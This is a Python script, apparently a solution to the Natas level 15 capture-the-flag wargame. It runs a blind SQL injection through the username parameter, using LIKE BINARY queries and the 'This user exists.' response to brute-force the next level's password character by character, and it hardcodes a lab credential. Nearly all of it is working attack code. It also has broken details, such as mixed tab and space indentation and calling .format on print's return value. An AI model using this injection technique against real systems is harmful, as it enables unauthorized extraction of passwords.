#from requests import *
import requests,string





a15usn = "natas15"
a15pass = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = "http://natas15.natas.labs.overthewire.org/"
    
chars = 'aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ1234567890'

passdict = []
msg = "This user exists."
    
for char in chars:
    passlooker = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"%', char, '%', '&debug'])
    requestcheck = requests.get(passlooker, auth = (a15usn, a15pass))
    if msg in requestcheck.text:
		passdict.append(char)
		
print("Dictionary is built")
print("Time to brute force :^)")

a16list = []
a16pass = ''

for i in range(0, 64):
        
    for char in passdict:

        posspass = ''.join([a16pass,char])

        passlooker = ''.join([url, '?', 'username=natas16"', '+and+password+LIKE+BINARY+"', posspass, '%', '&debug'])

        requestcheck = requests.get(passlooker, auth = (a15usn, a15pass))

        if msg in requestcheck.text:
            a16list.append(char)

            a16pass = ''.join(a16list)
                
            print("length: {0}, password: {1}").format(len(a16pass), a16pass)
